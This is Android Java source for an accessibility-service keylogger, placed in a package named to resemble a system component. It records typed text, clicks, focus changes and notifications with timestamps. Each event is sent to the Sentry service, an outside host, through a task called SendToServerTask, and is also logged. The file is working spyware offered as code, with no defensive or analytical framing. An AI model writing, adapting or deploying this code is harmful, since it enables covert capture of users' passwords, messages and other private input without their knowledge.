package com.android.logger;

import android.accessibilityservice.AccessibilityService;
import android.os.AsyncTask;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;

import io.sentry.Sentry;

/**
 * Created by Developer on 29/11/2020.
 */

public class Keylogger extends AccessibilityService {

    @Override
    public void onServiceConnected() {
        Sentry.captureMessage("Starting Service");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
        String time = df.format(Calendar.getInstance().getTime());

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(TEXT)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(FOCUSED)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(CLICKED)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_SELECTED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(SELECTED)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_ANNOUNCEMENT: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(ANNOUNCEMENT)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(NOTIFICATION STATE CHANGED)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(VIEW ACCESSIBILITY FOCUSED)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(VIEW ACCESSIBILITY FOCUS CLEARED)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(VIEW CONTEXT CLICKED)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(VIEW TEXT SELECTION CHANGED)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_WINDOWS_CHANGED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(WINDOWS CHANGED)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(LONG CLICKED)|" + data);
                break;
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {
        Sentry.captureMessage("Service Interrupted");
    }

    private class SendToServerTask extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {
            Log.d("android_log", " " + params[0]);
            String data = params[0];
            Sentry.captureMessage(data);
            return params[0];
        }
    }
}